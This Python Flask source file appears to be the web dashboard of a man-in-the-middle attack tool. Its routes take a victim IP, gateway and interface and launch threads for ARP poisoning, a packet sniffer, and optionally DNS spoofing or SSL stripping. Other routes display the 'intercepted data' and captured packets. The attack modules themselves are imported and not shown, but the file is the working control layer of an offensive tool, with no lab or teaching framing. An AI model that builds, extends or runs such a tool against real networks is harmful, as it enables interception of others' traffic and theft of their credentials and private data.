from flask import Flask, render_template, jsonify, request, Response
import threading
import scapy.all as scapy
from core import STATUS, STOP_EVENT, CAPTURE_DIR
from core.arp import run_attack_loop
from core.ssl_strip import run_ssl_strip
from core.dns import start_dns_spoofing 
from core.sniffer import start_sniffer

def create_app():
    app = Flask(__name__)
    
    # 1. ADD 'dns' TO THREAD TRACKER
    threads = {'attack': None, 'sniffer': None, 'ssl': None, 'dns': None}

    @app.route('/')
    def index():
        return render_template('index.html', data=STATUS)

    @app.route('/action', methods=['POST'])
    def action():
        req = request.json
        act = req.get('action')

        if act == 'clear_logs':
            STATUS["logs"] = [] # Empty the backend log list
            return jsonify({"status": "cleared"})
        
        if act == 'clear_data':
            STATUS["intercepted_data"] = [] # Empty the backend data list
            return jsonify({"status": "cleared"})
            
        if act == 'stop':
            STOP_EVENT.set()
            return jsonify({"status": "stopped"})

        if 'start' in act:
            STOP_EVENT.clear()
            STATUS["target"] = req.get('target')
            STATUS["gateway"] = req.get('gateway')
            STATUS["interface"] = req.get('interface')
            
            # 2. CRITICAL FIX: SAVE DNS SETTINGS FROM FRONTEND
            STATUS["dns_domain"] = req.get('dns_domain')
            STATUS["dns_ip"] = req.get('dns_ip')
            
            # Start Sniffer
            if not threads['sniffer'] or not threads['sniffer'].is_alive():
                threads['sniffer'] = threading.Thread(target=start_sniffer, daemon=True)
                threads['sniffer'].start()

            # Start ARP (Always runs for both attacks)
            STATUS["mode"] = "ARP SNIFF" # Default
            threads['attack'] = threading.Thread(
                target=run_attack_loop, 
                args=(STATUS["target"], STATUS["gateway"]), 
                daemon=True
            )
            threads['attack'].start()

            # 3. CRITICAL FIX: START THE DNS THREAD
            if act == 'start_dns':
                STATUS["mode"] = "DNS SPOOF"
                threads['dns'] = threading.Thread(target=start_dns_spoofing, daemon=True)
                threads['dns'].start()

            elif act == 'start_sslstrip':
                STATUS["mode"] = "SSL STRIP"
                threads['ssl'] = threading.Thread(target=run_ssl_strip, daemon=True)
                threads['ssl'].start()
            
            return jsonify({"status": "started"})
            
    @app.route('/update')
    def update(): return jsonify(STATUS)

    @app.route('/view/<pkt_id>')
    def view_packet(pkt_id):
        try:
            with open(f"{CAPTURE_DIR}/{pkt_id}.html", "r", encoding="utf-8") as f:
                content = f.read()
            return Response(content, mimetype='text/plain') 
        except: return "File not found."
        
    return app